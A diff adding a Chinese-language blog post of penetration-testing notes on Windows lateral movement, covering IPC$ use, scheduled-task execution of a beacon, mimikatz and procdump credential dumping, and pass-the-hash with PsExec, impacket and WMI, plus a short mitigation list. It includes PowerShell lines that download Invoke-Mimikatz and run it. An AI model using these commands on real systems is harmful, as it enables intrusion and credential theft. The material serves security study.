@@ -1,0 +1,924 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <link rel="icon" href="https://raw.githubusercontent.com/kIl3rr/photo/main/icon.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <meta name="description" content="横向移动IPCIPC(Inter Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用 通过ipc$可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信">
+<meta property="og:type" content="article">
+<meta property="og:title" content="横向移动">
+<meta property="og:url" content="http://example.com/2022/03/31/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="🗄">
+<meta property="og:description" content="横向移动IPCIPC(Inter Process Connection)共享命名管道的资源，是为了实现进程间通信而开放的命名管道。IPC可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用 通过ipc$可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
+<meta property="og:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png">
+<meta property="article:published_time" content="2022-03-31T04:51:36.018Z">
+<meta property="article:modified_time" content="2022-04-07T13:27:08.309Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="knowledge">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png">
+  
+  <title>横向移动 - 🗄</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-dark-dimmed.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+  
+<link rel="stylesheet" href="/css/macpanel.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>👩‍💻</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                Home
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                Archives
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                Categories
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                Tags
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                About
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                Links
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('https://raw.githubusercontent.com/kIl3rr/photo/main/post.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="横向移动">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-03-31 12:51" pubdate>
+        March 31, 2022 pm
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      16k 字
+    </span>
+  
+
+  
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      NaN 分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">横向移动</h1>
+            
+            <div class="markdown-body">
+              <h1 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h1><h2 id="IPC"><a href="#IPC" class="headerlink" title="IPC"></a>IPC</h2><p>IPC(Inter Process Connection)共享<code>命名管道</code>的资源，是为了实现进程间通信而开放的命名管道。<code>IPC</code>可以通过验证用户名和密码获取相应权限，通常在远程管理计算机和查看计算机的共享资源时使用</p>
+<p>通过<code>ipc$</code>可以与目标机器建立连接。利用这个连接，不仅可以访问目标机器只能够的文件，进行上传、下载等操作，还可以在目标机器上运行其他命令，以获取目标机器的目录结构、用户列表等信息</p>
+<p>建立一个<code>ipc$</code>并查看当前连接输入如下命令</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-built_in">net</span> use \\ip\ipc$ &quot;password&quot; /user:administrator<br><span class="hljs-built_in">net</span> use<br></code></pre></td></tr></table></figure>
+
+<p><strong>利用条件：</strong>开启139(NetBIOS)、445端口，管理员开启了默认共享，一般默认开启，对应的逻辑盘也可以访问到</p>
+<p><strong>报错：</strong></p>
+<ul>
+<li>错误号5:拒绝访问</li>
+<li>错误号51:windows无法找到网络路径，即网络中存在问题</li>
+<li>错误号53:找不到网络路径，包括IP地址错误、目标未开机、目标lanmanserver服务未启动、目标有防火墙（端口过滤）</li>
+<li>错误号67:找不到网络名，包括lanmanworkstation服务未启动、ipc$已被删除</li>
+<li>错误号1219:提供的凭据与已存在的凭据集冲突。例如，已经和目标建立了ipc$,需要在删除原连接后重新进行连接</li>
+<li>错误号1326:未知的用户名或密码错误</li>
+<li>错误号1792:试图登录，但是网络登录服务没有启动，包括目标NetLogin服务未启动（连接域控制器时会出现此情况）</li>
+<li>错误号2242:此用户的密码已经过期。例如，目标机器设置了账号管理策略，强制用户定期修改密码</li>
+</ul>
+<p>IPC建立后</p>
+<blockquote>
+<p>dir \\ip\C$</p>
+<p>tasklist /S ip /U administrator /P 123456</p>
+<p>net time \\ip</p>
+<p>copy beacon.exe \\ip\C$</p>
+<p>at \\ip  19:00:00 C:\beacon.exe</p>
+<p>at \\ip /delete</p>
+<p>//Windows Vista、windows server2008及之后版本的操作系统已将at命令废弃了</p>
+<p>schtasks /create /s ip /tn test /sc onstart c:\beacon.exe /ru system /f</p>
+<p>schtasks /run /s ip /i /tn “test”</p>
+<p>schtasks /delete /s ip  /tn “test” /f</p>
+<p>net use \\ip  /del /y</p>
+</blockquote>
+<h2 id="Windows-hash"><a href="#Windows-hash" class="headerlink" title="Windows hash"></a>Windows hash</h2><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8117#toc-16">https://xz.aliyun.com/t/8117#toc-16</a></p>
+<p>Windows认证协议有两种NTLM（NT LAN Manager）和Kerberos，前者主要应用于用于Windows NT 和 Windows 2000 Server（or  Later） 工作组环境，而后者则主要应用于Windows 2000 Server（or Later） 域（Domain）环境</p>
+<h3 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash&amp;NTLM Hash"></a>LM Hash&amp;NTLM Hash</h3><p>windows操作系统密码一般由两部分组成，一部分为<code>LM Hash</code>另一部分为<code>NTLM Hash</code>在Windows中，Hash的结构通常如下</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">username:</span>RID:LM-HASH:NT-HASH<br></code></pre></td></tr></table></figure>
+
+<p><strong>LM Hash</strong>全名为<code>LAN Manager Hash</code>是微软为了提高windows操作系统的安全性能而采用的散列加密算法，其<strong>本质是DES加密，密码不足14字节将用0补全</strong>。LM Hash较容易破解，但微软仅仅是将LM Hash禁用了<code>从windows Vista和windows server 2008版本开始，Windows操作系统默认禁用LM Hash</code>。LM Hash明文密码限定在14位以内，也就是说，如果要停止使用LM Hash 将用户密码设置为14位以上即可。如果抓取的LM Hash通常为<strong>AAD3B435B51404EEAAD3B435B51404EE</strong>表示<strong>密码为空或<code>LM Hash</code>被禁用</strong></p>
+<p><strong>NTLM Hash</strong>是微软为了提高安全性的同时兼容而设计的散列加密算法。NTLM Hash 是<strong>基于MD4加密算法</strong>进行加密的。个人版从Windows vista 服务器版从windows server2003以后，windows操作系统的认证方式均为NTLM Hash</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807162946-26dfbf56-d888-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>Net-NTLM Hash</strong></p>
+<p>存在两个版本</p>
+<p><strong>Net-NTLMv1:window2003和window xp之前默认启用</strong></p>
+<p>Net-ntlm hash v1的格式为username::hostname:LM response:NTLM response:challenge</p>
+<p>由于v1版本的加密方式比较脆弱，很容易解密得到NTLM Hash,基本在可控时间内能解出。</p>
+<p><strong>Net-NTLMv2:window2008 和 window Vist之后默认启用</strong></p>
+<p>Net-ntlm hash v2的格式为username::domain:challenge:HMAC-MD5:blob</p>
+<p>v2版本,加密方式比较强，但是可以进行明文爆破，利用难度比较大。</p>
+<p>NTLM使用在Windows NT和Windows 2000 Server（or  later）工作组环境中（Kerberos用在域模式下）；在AD域环境中，如果需要认证Windows  NT系统，也必须采用NTLM。NTLM主要是一种<strong>基于挑战（challenge）/响应（response）消息交互模式的认证过程</strong>：</p>
+<p>  1、用户登录时输入的user name、password和domain name，然后Client端计算password的hash值并保存在本地；</p>
+<p>  2、客户端将user name的明文发送给DC；</p>
+<p>  3、DC生成一个16-byte的随机数，叫做challenge，传输给client；</p>
+<p>  4、client收到challenge以后，在复制一份拷贝，然后将其中一个challenge用password hash加密，这个叫做response，然后将challenge，response以及user name传送给server；</p>
+<p>  5、server端在收到client传送过来的三份内容以后将它们转发给DC；</p>
+<p>  6、DC在收到user name，response，challenge以后，根据user name在account database中找到其对应的password hash，然后用这个password hash加密challenge；</p>
+<p>  7、DC将response跟加密后的challenge进行比较，如果相同则NTLM验证成功。DC将验证结果发给Server，并最终返回给Client。</p>
+<p>  如果是使用本地用户身份进行认证，则有Server本身完成认证过程。</p>
+<p><strong>hash储存：SAM文件(local)、NTDS.DIT文件(domain)</strong></p>
+<blockquote>
+<p>SAM(Security Account Manager) 安全账户管理器是一个数据库文件，在Windows  XP，Windows Vista,windows7-10用于存储用户的密码。他可以用来验证本地和远程用户。在windows 2000 sp4  开始,Active Dircetory 对远程用户进行身份验证。SAM使用加密措施来防止未经身份验证的用户访问系统。</p>
+<p>用户密码以哈希格式存储在 注册表配置单元中(registry hive), 作为LM Hash or NTLM Hash.</p>
+<p>这个文件可以在<code>%SystemRoot%/system32/config/SAM</code> 和 挂载在<code>HKLM/SAM</code></p>
+<p><a target="_blank" rel="noopener" href="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png"><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200807163204-78c2e474-d888-1.png" srcset="/img/loading.gif" lazyload></a></p>
+<p>WIndows运行时无法移动或者复制SAM文件，因为Windows 内核获取并在SAM文件上保留了独占的文件系统锁，并且在操作系统关闭之前不会释放该锁，但是我们可以通过多种技术比如pwdump来转储SAM内容的内存中副本，从而使密码哈希可用于离线暴力攻击。</p>
+<p>后来为了提高针对破解的SAM数据库的安全性, Microsoft 在Windows NT 4.0 中引入了SYSKEY功能。该功能会使用密钥对存储在SAM中的所有本地账户的密码哈希值进行加密。可以通过<code>syskey</code>程序来启用它。</p>
+</blockquote>
+<h4 id="hash抓取"><a href="#hash抓取" class="headerlink" title="hash抓取"></a>hash抓取</h4><p>比较老的工具：<a target="_blank" rel="noopener" href="http://www.tarasco.org/security/pwdump_7/index.html">PwDump7</a>，需要管理员权限</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">usage:<br>pwdump7.<span class="hljs-keyword">exe</span> (Dump <span class="hljs-built_in">system</span> passwords)<br>pwdump7.<span class="hljs-keyword">exe</span> -s <span class="hljs-symbol">&lt;samfile&gt;</span> <span class="hljs-symbol">&lt;systemfile&gt;</span> (Dump passwords from <span class="hljs-keyword">files</span>)<br>pwdump7.<span class="hljs-keyword">exe</span> -d <span class="hljs-symbol">&lt;filename&gt;</span> [destionation] (Copy filename <span class="hljs-keyword">to</span> destionation)<br>pwdump7.<span class="hljs-keyword">exe</span> -h (Show this <span class="hljs-keyword">help</span>)<br></code></pre></td></tr></table></figure>
+
+<p>非常出名的工具：<a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a></p>
+<blockquote>
+<ul>
+<li>lsass.exe进程读取(内存)</li>
+</ul>
+<p>privilege::debug //提升至debug权限</p>
+<p>sekurlsa::logonpasswords //从lsass.exe的内存中抓取密码hash</p>
+<p>//mimikatz.exe “privilege::debug” “log” “sekurlsa::logonpasswords”</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220102572.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>online</li>
+</ul>
+<p>privilege::debug</p>
+<p>token::elevate //模拟一个SYSTEM令牌</p>
+<p>lsadump::sam //从sam文件导出密码hash</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220228030.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/peterdocter/quarkspwdump">QuarkPwDump</a>，需编译</p>
+<p>还可以导出<code>SAM和SYSTEM</code>文件再抓取密码</p>
+<blockquote>
+<p>reg save HKLM\SYSTEM system.hive</p>
+<p>reg save HKLM\SAM sam.hive</p>
+<p>reg save HKLM\security security.hive</p>
+</blockquote>
+<p>将把导出的<code>sam.hive</code>跟<code>system.hive</code>文件放到<code>mimikatz</code>下</p>
+<blockquote>
+<ul>
+<li>offline</li>
+</ul>
+<p>lsadump::sam /sam:sam.hive /system:system.hive</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404220447046.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<ul>
+<li>进程导出</li>
+</ul>
+<ol>
+<li><p>任务管理器-&gt;进程中创建转储文件</p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump">Procdump</a>是微软的工具，杀毒软件不会拦截</p>
+</li>
+</ol>
+<blockquote>
+<p>procdump64.exe -accepteula -ma lsass.exe lsass.dmp</p>
+<p>再mimikatz导出密码hash</p>
+<p>sekurlsa::minidump lsass.DMP<br>sekurlsa::logonPasswords full</p>
+</blockquote>
+<p>cs</p>
+<p>powershell</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -DumpCreds&quot;</span><br><br>powershell <span class="hljs-string">&quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#x27;); Invoke-Mimikatz -Command \&quot;</span>privilege::debug token::elevate  lsadump::sam <span class="hljs-keyword">exit</span>\<span class="hljs-string">&quot;&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="防范抓取明文密码和hash"><a href="#防范抓取明文密码和hash" class="headerlink" title="防范抓取明文密码和hash"></a>防范抓取明文密码和hash</h4><p><strong>1、设置Active Directory2012 R2功能级别</strong></p>
+<p>windows server 2012 R2新增了一个名为<code>受保护的用户</code>的用户组。将需要保护的用户放入该组，则无法使用mimikatz等工具抓取明文密码和散列值了</p>
+<p><strong>2、安装KB2871997</strong></p>
+<p>KB2871997是解决PsExec或IPC远程查看（c$）问题的补丁，被使本地账号不再被允许远程接入计算机系统，但系统默认的本地管理员账号Administrator这个SID为500的用户例外，改名也没法，因为SID是不变的，依旧可以横向获取内网其他计算机的权限，需要禁用默认的Administrator账号，则可防御哈希传递</p>
+<p><strong>3、通过修改注册表禁止在内存中存储明文密码</strong></p>
+<p>WDigest协议，该协议能够使Windows将明文密码存储在内存中，以方便用户登录本地计算机，可通过修改注册表的方式，解决内存中以明文存储密码的问题</p>
+<p><strong>4、防御mimikatz</strong></p>
+<p>mimikatz在抓取散列值或明文密码时需要使用Debug权限（因为mimikatz需呀和lsass进程进行交互，如果没有Debug权限，mimikatz将不能读取lsass进程）。将拥有Debug权限的本地管理员从Administrator组中删除,重启</p>
+<h2 id="Pass-The-Hash"><a href="#Pass-The-Hash" class="headerlink" title="Pass The Hash"></a>Pass The Hash</h2><p><strong>截取到hash后，哈希传递一般是在非域用户中进行传递，实验时发现，域用户不用进行hash传递就可以建立IPC连接</strong></p>
+<p><code>哈希传递（Pass The Hash）攻击</code>，该方法通过找到与账户相关的密码散列值，通常是<code>NTLM Hash</code>来进行攻击。域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码。若计算机的本地管理员账号和密码是相同的，就可以使用哈希传递的方法登录内网中的其他计算机，这种哈希传递，可以省去破解密码散列值，即获得密码明文的步骤</p>
+<p>Windows中，散列值是用来证明身份的（有正确的用户名和密码散列值，就能通过验证）。在windows server 2012 R2  及之后的操作系统中，默认在内存不会记录明文密码。因此可使用工具将散列值传递到其他计算机，进行权限验证，进而对其他计算机获取控制权限</p>
+<ol>
+<li>mimikatz</li>
+</ol>
+<blockquote>
+<p>privilege::debug</p>
+<p>sekurlsa::pth /user:Administrator /domain:god /ntlm:8a963371a63944419ec1adf687bb1be5  //使用ntlm传递</p>
+<h4 id="Pass-the-key"><a href="#Pass-the-key" class="headerlink" title="Pass the key"></a>Pass the key</h4><p>也可以用AES-256等传递，<strong>获取：sekurlsa::ekeys</strong>  </p>
+<p>还是使用IPC等无密码连接到目AES标主机，dir \STU1\C$</p>
+</blockquote>
+<p>可见，没有进行hash修改的IPC等连接会出现登录失败</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220404135504518.png" srcset="/img/loading.gif" lazyload></p>
+<ol start="2">
+<li>psexec</li>
+</ol>
+<p>微软官方版本：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec">https://docs.microsoft.com/zh-cn/sysinternals/downloads/psexec</a></p>
+<blockquote>
+<p>需要远程系统开启admin$共享（默认是开启的）</p>
+<p>在使用ipc$连接目标系统后，不需要输入账号和密码</p>
+<p>使用PsExec执行命令时，由于创建或删除服务时<strong>会产生大量的日志，可通过日志反推攻击流程</strong></p>
+<p><strong>使用PsExec可以直接获得system权限的交互式shell</strong></p>
+<p>建立IPC后使用，可以弹回一个shell</p>
+<p>net use \\192.168.20.128 “password” /user:Administrator</p>
+<p>//-accepteula 第一次执行PsExec时会弹出确认框，而使用该参数就可以在静默模式下运行而不会被发现 -s system</p>
+<p>psexec.exe -accepteula \\192.168.20.128 -s cmd.exe</p>
+<p>psexec.exe -accepteula \\192.168.20.128 cmd.exe</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/psexec.gif" srcset="/img/loading.gif" lazyload alt="psexec"></p>
+<p>没有建立IPC</p>
+<p>PsExec.exe \192.168.20.128 -u QWE\Administrator -p password cmd.exe</p>
+</blockquote>
+<p>使用PsExec，会在目标机中创建一个新的服务PSEXESVC；在结束交互后，PsExec服务会自动删除，但是在创建以及删除时会产生大量日志信息，所以可以基于此对攻击者进行溯源。拜读了一下<a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/146441.html">酒仙桥六号部队的浅谈PSEXEC做的那些事</a></p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405133254579.png" srcset="/img/loading.gif" lazyload></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">impacket</a></p>
+<blockquote>
+<p>python psexec.py  <a href="mailto:&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#x38;">&#x41;&#x64;&#x6d;&#105;&#110;&#x69;&#x73;&#116;&#114;&#97;&#116;&#x6f;&#114;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#x38;&#46;&#x32;&#x30;&#x2e;&#49;&#50;&#x38;</a>   -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://github.com/maaaaz/impacket-examples-windows">impacket-win</a></p>
+<p>微软自带的psexec我是通过使用mimikatz哈希传递后建立IPC连接然后psexec去获得shell，这个工具包可以自己pth</p>
+<p>用法：</p>
+<blockquote>
+<p>Impacket v0.9.17 - Copyright 2002-2018 Core Security Technologies</p>
+<p>usage: psexec.exe [-h] [-c pathname] [-path PATH] [-file FILE] [-debug]<br>               [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key]<br>               [-dc-ip ip address] [-target-ip ip address]<br>               [-port [destination port]] [-service-name service name]<br>               target [command [command …]]</p>
+<p>PSEXEC like functionality example using RemComSvc.</p>
+<p>positional arguments:<br>target                [[domain/]username[:password]@]&lt;targetName or address&gt;<br>command               command (or arguments if -c is used) to execute at the<br>                     target (w/o path) - (default:cmd.exe)</p>
+<p>optional arguments:<br>-h, –help            show this help message and exit<br>-c pathname           copy the filename for later execution, arguments are<br>                     passed in the command option<br>-path PATH            path of the command to execute<br>-file FILE            alternative RemCom binary (be sure it doesn’t require<br>                     CRT)<br>-debug                Turn DEBUG output ON</p>
+<p>authentication:<br><strong>-hashes LMHASH:NTHASH</strong><br>                     NTLM hashes, format is LMHASH:NTHASH<br>-no-pass              don’t ask for password (useful for -k)<br>-k                    Use Kerberos authentication. Grabs credentials from<br>                     ccache file (KRB5CCNAME) based on target parameters.<br>                     If valid credentials cannot be found, it will use the<br>                     ones specified in the command line<br>-aesKey hex key       AES key to use for Kerberos Authentication (128 or 256<br>                     bits)</p>
+<p>connection:<br>-dc-ip ip address     IP Address of the domain controller. If omitted it<br>                     will use the domain part (FQDN) specified in the<br>                     target parameter<br>-target-ip ip address<br>                     IP Address of the target machine. If omitted it will<br>                     use whatever was specified as target. This is useful<br>                     when target is the NetBIOS name and you cannot resolve<br>                     it<br>-port [destination port]<br>                     Destination port to connect to SMB Server<br>-service-name service name<br>                     This will be the name of the service</p>
+</blockquote>
+<blockquote>
+<p>psexec.exe <a href="mailto:&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#x2e;&#49;&#50;&#56;">&#x41;&#x64;&#109;&#105;&#x6e;&#x69;&#115;&#116;&#114;&#97;&#116;&#111;&#114;&#64;&#49;&#57;&#50;&#x2e;&#x31;&#54;&#56;&#x2e;&#50;&#x30;&#x2e;&#49;&#50;&#56;</a> -hashes 11cb3f697332ae4c82681f36d6708901:aba61272394a2f975d6543aa0541b005</p>
+<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220405134813532.png" srcset="/img/loading.gif" lazyload></p>
+</blockquote>
+<p>msf也有psexec模块</p>
+<ol start="3">
+<li>WMI</li>
+</ol>
+<p>由于PsExec威力很大，也被列入黑名单，而且容易暴露，于是就使用了隐蔽性更好的WMI</p>
+<p>WMI是“Windows Management Instrumentation”的缩写，WMI是从Windows98开始，系统自带的一系列工具集。WMI提供了/node选项，可以通过135端口上的RPC服务进行远程访问，或者执行远程命令。Windows操作系统默认不会将WMI的操作记录到日志当中，而且因为采用的是无文件攻击，所以导致WMI具有极高的隐蔽性。由此，越来越多的APT开始使用WMI进行攻击，利用WMI可以进行信息收集、探测、反病毒、虚拟机检测、命令执行、权限持久化等操作。</p>
+<blockquote>
+<p>wmic /node:192.168.20.128 /user:Administrator /password:p@ssword123. process call create “cmd.exe /c ipconfig &gt;c:\ip.txt”</p>
+</blockquote>
+<p>建立IPC后，type读取txt</p>
+<blockquote>
+<p>net use \DC “p@ssword123.” /user:Administrator<br>type \DC\C$\ip.txt</p>
+</blockquote>
+<p>使用wmic远程执行命令，在远程系统中启动windows management lnstrumentation  服务（目标服务器需要开放135端口，wmic会以管理员权限在远程系统中执行命令）。如果目标服务器开启了防火墙，wmic将无法进行连接。wmic命令没有回显，需要使用<code>ipc$和type</code>命令来读取信息，若使用wmic执行恶意程序，将不会留下日志</p>
+<p>还是使用impacket的两个工具包，有些还支持socks代理</p>
+<blockquote>
